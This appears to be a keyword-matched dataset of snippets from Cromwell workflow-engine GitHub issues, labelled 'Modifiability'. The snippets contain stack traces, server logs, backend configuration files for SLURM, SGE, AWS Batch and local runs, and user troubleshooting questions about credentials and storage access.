com.typesafe.config.impl.ConfigParser.parse(ConfigParser.java:25); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:263); at com.typesafe.config.impl.Parseable.rawParseValue(Parseable.java:250); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:180); at com.typesafe.config.impl.Parseable.parseValue(Parseable.java:174); at com.typesafe.config.impl.Parseable.parse(Parseable.java:301); at com.typesafe.config.ConfigFactory.parseFile(ConfigFactory.java:793); at com.typesafe.config.ConfigFactory.parseApplicationReplacement(ConfigFactory.java:1166); at com.typesafe.config.DefaultConfigLoadingStrategy.parseApplicationConfig(DefaultConfigLoadingStrategy.java:11); at com.typesafe.config.ConfigFactory.defaultApplication(ConfigFactory.java:532); at com.typesafe.config.Co",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7255:1654,Config,ConfigParser,1654,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7255,1,['Config'],['ConfigParser']
Modifiability,"rovided in https://github.com/aws-samples/aws-genomics-workflows/blob/master/src/templates/cromwell/cromwell-aio.template.yaml. ; In summary, the set up is a EC2 instance running `java -jar cromwell.jar server` and calling AWS Batch to run WDL workflow using an attached EC2 instance profile. . I have no issue posting workflows and getting results. However, after a certain period of time, I will get `The security token included in the request is expired` error message logged by the cromwell server when I try to post a job. ; - I have checked that `~/.aws` and the AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY environment variable don't exist. ; - If I kill the server and restart it again, the server seem to pick up the new security token and I can post workflow again. ; - Checking `cromwell.config` (pasted below), all authentication methods are set to `default` which is documented to mean it is using `DefaultCredentialProvider` in the AWS Java SDK. That should be refreshing the security token? . Is this unexpected behaviour or did I configure something wrongly? . Thanks for your help!. ----. Config file for the cromwell serve:; ```; include required(classpath(""application"")). webservice {; interface = localhost; port = 8000; }. system {; job-rate-control {; jobs = 1; per = 2 second; }; }. aws {; application-name = ""cromwell""; auths = [{; name = ""default""; scheme = ""default""; }]; region = ""ap-southeast-2""; }. engine { filesystems { s3 { auth = ""default"" } } }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 10; numCreateDefinitionAttempts = 10; root = ""XXXX""; auth = ""default""; default-runtime-attributes { queueArn = ""XXXXX"" }; filesystems { s3 { auth = ""default"" } }; }; }; }; }; workflow-options {; workflow-log-dir = ""cromwell-workflow-logs""; workflow-log-temporary = false; }. call-caching {; enabled = true; invalidate-bad-cache-results = true; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162:1157,config,configure,1157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162,3,"['Config', 'config']","['Config', 'config', 'configure']"
Modifiability,"rovided.; 2020/07/28 21:30:48 Retrying with user project; Copying file:///google/logs/output [Content-Type=text/plain; charset=UTF-8]...; ```; At least that's fully clarified. However I still get the error:; ```; 2020/07/28 21:30:43 Localizing input gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram -> /cromwell_root/fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram; Error attempting to localize file with command: 'mkdir -p '/cromwell_root/fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/' && rm -f /root/.config/gcloud/gce && gsutil -o 'GSUtil:parallel_thread_count=1' -o 'GSUtil:sliced_object_download_max_components=1' cp 'gs://fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/CW60141_P13_MT_1-19-18.cram' '/cromwell_root/fc-118c254f-010a-4ee6-b149-6f0bb5abaa77/GeneticNeuroscience_McCarroll_CIRM_GRU_Exome_9qCN-LOH_PDO-21129/RP-1875/Exome/CW60141_P13_MT_1-19-18/v1/''; AccessDeniedException: 403 xxx@xxx.gserviceaccount.com does not have storage.objects.list access to the Google Cloud Storage bucket.; ```; I am starting to guess that this is a settings issue with the bucket, not with my service account. My best guess is that, albeit extremely counter-intuitive, I have access to this bucket with my personal account but I do not have access to this bucket with my service account. Oh my, this is so complicated ... As for Terra, I have used it quite a bit for the last week but, and I am not alone in saying this, Terra is not a good environment for development of new WDLs. For example, just to upload a new WDL for testing it takes so many steps. ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665298885:2157,config,config,2157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665298885,2,['config'],['config']
Modifiability,"rp/ExomeGermlineSingleSample_v3.1.9.wdl \; -i /mainfs/wrgl/broadinstitute_warp_development/tutorials/Exom_test.json. #### Configuration file ###. include required(classpath(""application"")). system {; # If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; abort-jobs-on-terminate = false; }. backend {; default = SLURM. providers {; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; temporary-directory = ""$(mktemp -d /tmp/tmp.XXXXXX)"". runtime-attributes = """"""; Int runtime_minutes = 60; Int cpu = 1; Int memory_mb = 3900; String? docker; """""". submit = """""" \; 'sbatch \; --wait \; -J ${job_name} \; -D ${cwd} \; -o ${out} \; -e ${err} \; -t ${runtime_minutes} \; -p batch,scavenger \; -c ${cpu} \; --mem $(( (${memory_mb} >= ${cpu} * 3900) ? ${memory_mb} : $(( ${cpu} * 3900 )) )) \; -N 1 \; --exclusive \; --wrap ""/bin/bash ${script}""'; """""". submit-docker = """""" \. # Make sure the SINGULARITY_CACHEDIR variable is set. If not use a default; # based on the users home.; module load apptainer; if [ -z $APPTAINER_CACHEDIR ];; then CACHE_DIR=$HOME/.apptainer/cache; else CACHE_DIR=$APPTAINER_CACHEDIR; fi; # Make sure cache dir exists so lock file can be created by flock; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/apptainer_pull_flock; # Create an exclusive filelock with flock. --verbose is useful for; # for debugging, as is the echo command. These show up in `stdout.submit`.; flock --exclusive --timeout 900 $LOCK_FILE \; apptainer exec --containall /mainfs/wrgl/broadinstitute_warp_development/warp/images/${docker}.sif \; echo ""successfully pulled ${docker}!"". # Submit the script to SLURM. 'sbatch \; --wait \; -J ${job_name} \; -D ${cwd} \; -o ${cwd}/execution/stdout \; -e ${cwd}/execution/stderr \; -t ${runtime_minutes} \; -p batch,scavenger \; -c ${cpu} \; --mem $(( (${memory_mb} >= ${cpu} * 3900) ? ${memory_mb} : $(( ${cpu} * 3900 )) )) \; -N 1 \; --exclusive \; --wrap \; ""modu",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7086:1703,variab,variable,1703,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7086,1,['variab'],['variable']
Modifiability,"rror about that: ; [aws.conf.txt](https://github.com/broadinstitute/cromwell/files/2099528/aws.conf.txt). ```; 2018-06-13 14:29:27,796 cromwell-system-akka.dispatchers.api-dispatcher-72 INFO - Unspecified type (Unspecified version) workflow a67833cb-b894-4790-872f-9f3104cab60c submitted; 2018-06-13 14:29:44,760 cromwell-system-akka.dispatchers.engine-dispatcher-5 INFO - 1 new workflows fetched; 2018-06-13 14:29:44,761 cromwell-system-akka.dispatchers.engine-dispatcher-5 INFO - WorkflowManagerActor Starting workflow UUID(a67833cb-b894-4790-872f-9f3104cab60c); 2018-06-13 14:29:44,765 cromwell-system-akka.dispatchers.engine-dispatcher-5 INFO - WorkflowManagerActor Successfully started WorkflowActor-a67833cb-b894-4790-872f-9f3104cab60c; 2018-06-13 14:29:44,765 cromwell-system-akka.dispatchers.engine-dispatcher-5 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-13 14:29:44,774 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-13 14:29:45,255 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - MaterializeWorkflowDescriptorActor [UUID(a67833cb)]: Parsing workflow as WDL draft-2; 2018-06-13 14:29:46,004 cromwell-system-akka.dispatchers.engine-dispatcher-32 INFO - MaterializeWorkflowDescriptorActor [UUID(a67833cb)]: Call-to-Backend assignments: demux_only.illumina_demux -> AWSBATCH; 2018-06-13 14:29:46,085 cromwell-system-akka.dispatchers.backend-dispatcher-91 WARN - AWSBATCH [UUID(a67833cb)]: Key/s [preemptible, dx_instance_type] is/are not supported by backend. Unsupported attributes will not be part of job executions.; 2018-06-13 14:29:47,088 cromwell-system-akka.dispatchers.backend-dispatcher-91 WARN - Localhost hostname lookup failed, keeping the value 'unavailable'; java.util.concurrent.TimeoutException: null; 	at java.util.concurrent.FutureTask.get(FutureTask.java:205); 	at com.getsentry.raven.event.EventBuilder$HostnameC",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3774:1653,config,configured,1653,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3774,1,['config'],['configured']
Modifiability,"rrors on our HPC that occur randomly and qsub/qstat go down temporarily and result in `failed (during ExecutingWorkflowState): java.lang.RuntimeException: Unable to start job.`. I was hoping this would retry failed submissions. . This is my current config:. ```; include required(classpath(""application"")). webservice {; port = 8000; interface = 127.0.0.1; }. #call-caching {; # enabled = true; # invalidate-bad-cache-results = true; #}. system {; job-rate-control {; jobs = 20; per = 1 second; }; }. backend {; default = SGE. providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 10; root = ""cromwell-executions""; run-in-background = true. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; String ? docker; String ? docker_user; """""". submit = ""/bin/bash ${script}"". submit-docker = """"""; docker run \; --rm -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; """""". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; caching {; duplication-strategy: [; ""hard-link"", ""soft-link"", ""copy""; ]; hashing-strategy: ""file""; check-sibling-md5: false; }; }; }; }; }. SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; root = ""cromwell-executions""; exit-code-timeout-seconds = 600; concurrent-job-limit = 100. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; Int cpu = 1; Float ? memory_gb; String sge_queue = ""dgdcloud.q""; String ? sge_project; """""". submit = """"""; qsub \; -terse \; -V \; -b n \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l h_vmem="" + memory_gb / cpu + ""g""} \; ${""-l mem_free="" + memory_gb / cpu + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362:1392,config,config,1392,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362,3,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,runtime attribute override behavior depends upon variable name,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2068:49,variab,variable,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2068,1,['variab'],['variable']
Modifiability,"ry = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {. runtime-attributes = """"""; String time = ""11:00:00""; Int cpu = 4; Float? memory_gb; String sge_queue = ""hammer.q""; String? sge_project; String? docker; """""". submit = """"""; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l mem_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; /usr/bin/env bash ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)"". submit-docker = """""" ; qsub \; -terse \; -V \; -b y \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l mem_free="" + memory_gb + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; ""docker exec -v ${cwd}:${docker_cwd} -v <path> ${job_shell} ${docker_script}""; """""". default-runtime-attributes; {; failOnStderr: false; continueOnReturnCode: 0; }; }; } ; }; Local; {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config; {; #concurrent-job-limit = 5; run-in-background = true; # The list of possible runtime custom attributes.; runtime-attributes = """"""; String? docker; String? mountOption; """""". # Submit string when there is no ""docker"" runtime attribute.; submit = ""/usr/bin/env bash ${script}""; ; # if the apptainer .sif for the image is created this will automatically use it; # otherwise it will pull from dockerhub; # if not using on dori change the source path for /refdata; submit-docker = """"""; 	 apptainer exec --cleanenv --bind ${cwd}:${docker_cwd},<path> \ ; docker://${docker} ${job_shell} ${script} ; """""". filesystems; {; local; {; localization: [ ""hard-link"", ""soft-link"", ""copy"" ]. caching {; duplication-strategy: [ ""hard-link"", ""soft-link"", ""copy"" ]; hashing-strategy: ""fingerprint""; fingerprint-size: 10485760; }; }; }. default-runtime-attributes; {; failOnStderr: false; continueOnReturnCode: 0; }; }; }; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7480:5712,config,config,5712,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7480,3,"['Config', 'config']","['ConfigBackendLifecycleActorFactory', 'config']"
Modifiability,"ry DockerHub to resolve ""ubuntu:latest"" to something like; // a2c950138e95bf603d919d0f74bec16a81d5cc1e3c3d574e8d5ed59795824f47; //; // A value of 'true' means that call hashes will more accurately represent the; // Docker image that was used to run the call, but at a cost of having to make a; // request to an external service (DockerHub, GCR). If a call fails to lookup a; // Docker hash, it will fail.; lookup-docker-hash = false; }. google {. application-name = ""cromwell"". auths = [; {; name = ""application-default""; scheme = ""application_default""; },; {; name = ""user-via-refresh""; scheme = ""refresh_token""; client-id = ""secret_id""; client-secret = ""secret_secret""; },; {; name = ""service-account""; scheme = ""service_account""; service-account-id = ""my-service-account""; pem-file = ""/path/to/file.pem""; }; ]; }. engine {; // This instructs the engine which filesystems are at its disposal to perform any IO operation that it might need.; // For instance, WDL variables declared at the Workflow level will be evaluated using the filesystems declared here.; // If you intend to be able to run workflows with this kind of declarations:; // workflow {; // String str = read_string(""gs://bucket/my-file.txt""); // }; // You will need to provide the engine with a gcs filesystem; // Note that the default filesystem (local) is always available.; //filesystems {; // gcs {; // auth = ""application-default""; // }; //}; }. backend {; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 28; run-in-background = true; runtime-attributes = ""String? docker""; submit = ""/bin/bash ${script}""; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". // Root directory where Cromwell writes job results. This directory must be; // visible and writeable by the Cromwell process as well as the jobs that Cromwell; // launches.; root: ""cromwell-executions"". filesystems",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:87342,variab,variables,87342,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,1,['variab'],['variables']
Modifiability,"s = 30; per = 1 second; }; }. ## file based persistent database; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; connectionTimeout = 120000; numThreads = 1; }; }. call-caching {; enabled = true; }. backend {; default = ""Local""; providers { ; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 10; run-in-background = true; submit = ""/usr/bin/env bash ${script}""; root = ""cromwell-executions""; filesystems {; local {; localization: [""soft-link""]; caching {; duplication-strategy: [""soft-link""]; hasing-strategy: [""path+modtime""]; }; }; }; }; }; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 500; runtime-attributes = """"""; Int threads = 1; String memory = ""2g""; String dx_timeout; """"""; submit = """"""; sbatch; --account <account>; --partition ind-shared; --nodes 1; --job-name=${job_name}-%j; # --output=logs/{job_name}/$j.out; 	 -o ${out} -e ${err} ; --mail-type FAIL --mail-user <email-address>; --ntasks-per-node=${threads}; --mem=${memory}; --time=${dx_timeout}; --parsable; --chdir ${cwd}; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }}; ```. Here's the log printed to the terminal. Notice the jump from [2022-12-15 21:15:03,84] to [2022-12-15 21:22:59,01]; ```; $ java -Dconfig.file=workflow/cromwell.conf -jar utilities/cromwell-84.jar run workflow/expanse_workflow.wdl; [2022-12-15 21:14:44,99] [info] Running with database db.url =; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6971:2251,config,config,2251,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6971,1,['config'],['config']
Modifiability,"s a residual `gs://` path; all other interpolations are correctly relativized. On AWS with Cromwell 9341a4dac6145233f2a33b092a8fc443c18744ea, both concatenations leave residual `s3://` paths. On Local with Cromwell 7c52320b3844fb83959a784a16c613c62b8bec1c and an input file under my home directory, this throws an exception with the following trace:. ```; 2017-02-02 11:55:36,701 cromwell-system-akka.dispatchers.backend-dispatcher-44 ERROR - BackgroundConfigAsyncJobExecutionActor [UUID(5fdb357a)w.files:NA:1]: Error attempting to Execute; java.lang.IllegalArgumentException: null; 	at sun.nio.fs.UnixPath.subpath(UnixPath.java:346); 	at sun.nio.fs.UnixPath.subpath(UnixPath.java:43); 	at cromwell.backend.io.JobPathsWithDocker.toDockerPath(JobPathsWithDocker.scala:35); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$class.toUnixPath(SharedFileSystemAsyncJobExecutionActor.scala:107); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.toUnixPath(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$commandLineValueMapper$1.apply(SharedFileSystemAsyncJobExecutionActor.scala:127); 	at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor$$anonfun$commandLineValueMapper$1.apply(SharedFileSystemAsyncJobExecutionActor.scala:127); 	at wdl4s.command.ParameterCommandPart.instantiate(ParameterCommandPart.scala:55); 	at wdl4s.Task$$anonfun$instantiateCommand$1$$anonfun$apply$2.apply(Task.scala:108); 	at wdl4s.Task$$anonfun$instantiateCommand$1$$anonfun$apply$2.apply(Task.scala:108); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:234); 	at scala.collection.Iterator$class.foreach(Iterator.scala:893); 	at scala.collection.AbstractIterator.foreach(Iterator.scala:1336); 	at scala.collection.IterableLike$class.foreach(IterableLike.scala:72); 	at scala.collection.Abstrac",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1944:1601,Config,ConfigAsyncJobExecutionActor,1601,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1944,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"s commit; https://github.com/broadinstitute/cromwell/commit/775d2cb414734080978cc9c2533cab41b4acfad5; ```; [jeremiah@localhost cromwell]$ java -Dconfig.file=/home/jeremiah/cromwell.mysql.conf -jar server/target/scala-2.12/cromwell-37-88f82a0-SNAP.jar server; 2019-01-31 18:42:55,062 INFO - Running with database db.url = jdbc:mysql://localhost/cromwell?rewriteBatchedStatements=true; 2019-01-31 18:43:01,372 INFO - Successfully acquired change log lock; 2019-01-31 18:43:04,396 INFO - Creating database history table with name: cromwell.DATABASECHANGELOG; 2019-01-31 18:43:04,492 INFO - Reading from cromwell.DATABASECHANGELOG; 2019-01-31 18:43:04,918 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,926 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,926 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,927 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,927 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,928 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,928 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configuration if this is the case; 2019-01-31 18:43:04,929 WARN - modifyDataType will lose primary key/autoincrement/not null settings for mysql. Use <sql> and re-specify all configur",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4605:5164,config,configuration,5164,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4605,1,['config'],['configuration']
Modifiability,"s my docker-compose.yml; ```version: '2'; services:; cromwell:; build: ; context: ./compose/cromwell; volumes:; - ./cromwell-executions:/cromwell-working-dir/cromwell-executions; - /data1:/data1; command: [""/wait-for-it/wait-for-it.sh mysql-db:3306 -t 120 -- java -Dconfig.file=/app-config/cromwell-application.conf -jar /app/cromwell.jar server""]; links:; - mysql-db; ports:; - ""80:8000""; mysql-db:; image: ""mysql:5.7""; environment:; - MYSQL_ROOT_PASSWORD=cromwell; - MYSQL_DATABASE=cromwell_db; volumes:; - ./compose/mysql/init:/docker-entrypoint-initdb.d; - ./compose/mysql/data:/var/lib/mysql; ports:; - ""3307:3306""; ```. and here is my crowell config file:. ```include required(classpath(""application"")). # Note: If you spot a mistake in this configuration sample, please let us know by making an issue at:; # https://github.com/broadinstitute/cromwell/issues. call-caching {; enabled = false; }. backend {; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; run-in-background = true; runtime-attributes = ""String? docker Int? max_runtime = 2""; submit = ""/bin/bash ${script}""; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". # Root directory where Cromwell writes job results. This directory must be; # visible and writeable by the Cromwell process as well as the jobs that Cromwell; # launches.; root: ""cromwell-executions"". filesystems {; local {; localization: [; ""soft-link"", ""hard-link"", ""copy""; ]. caching {; duplication-strategy: [; ""soft-link""; ]. # Possible values: file, path; # ""file"" will compute an md5 hash of the file content.; # ""path"" will compute an md5 hash of the file path. This strategy will only be effective if the duplication-strategy (above) is set to ""soft-link"",; # in order to allow for the original file path to be hashed.; hashing-strategy: ""path"". # When true, will check if a sibling file with the same name and the .md5 extension",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7006:1114,config,config,1114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7006,1,['config'],['config']
Modifiability,"s to emulate / implement should be further refined with respect to HSQLDB. Plugging in `file:` will absolutely work for ""hello world"". But if one runs cromwell(s) the wrong way the db may become corrupted/deadlocked negating the ability to call-cache. Many databases have minimal to no support for sharing an embedded instance between concurrent procs. SQLite has the most ""support"" afaik but a) would require _a lot_ of custom Cromwell code, and b) still has other issues such as in NFS environments. Depending on whomever this ticket is aimed at, if they're using an HPC environment like our methods users do we'd have to be careful not to store a multiprocess embedded DB on NFS. Today with HSQLDB `mem:` cromwell uses a pair of ephemeral database connection pools. I'm not sure the behavior if both pools are pointed at the same HSQLDB `file:`, but I think it might work as the docs only warn of connecting from multi-process not multi-pool. The default config mentioned in this ticket may still consider using separate `file:` instances just in case. All issues above have workarounds with varying degrees of difficulty and/or documentation warnings. For example one could clarify the documentation with ""Cromwell only supports one instance connecting to the pair of default _file:_ databases at a time."" Or: ""Cromwell only supports call caching when running a workflow with the same name"" because we did something like generate the db file based on the workflow name. Another option, instead of having multiple processes access the same embedded DB, is to research spinning up a background daemon db process, which do support multiple connections. Links to consider when defining acceptance criteria are below. . Re: our existing/proposed HSQLDB usage; - Cromwell's `database.metadata` and `database.engine` when absent both [fall back to the root `database` stanza.](https://github.com/broadinstitute/cromwell/blob/088e12d97dd18f463e6a387a6ffb002d9725cbe4/services/src/main/scala/cromwell/serv",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3786#issuecomment-398204194:1165,config,config,1165,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3786#issuecomment-398204194,2,['config'],['config']
Modifiability,"s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript$(ConfigAsyncJobExecutionActor.scala:55); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:43); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs$(ConfigAsyncJobExecutionActor.scala:39); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner$(SharedFileSystemAsyncJobExecutionActor.scala:171); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.makeProcessRunner(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.$anonfun$execute$2(SharedFileSystemAsyncJobExecutionActor.scala:145); at scala.util.Either.fold(Either.scala:188); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute(SharedFileSystemAsyncJobExecutionActor.scala:144); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.execute$(SharedFileSystemAsyncJobExecutionActor.scala:139); at cromwell.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:2711,Config,ConfigAsyncJobExecutionActor,2711,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['Config'],['ConfigAsyncJobExecutionActor']
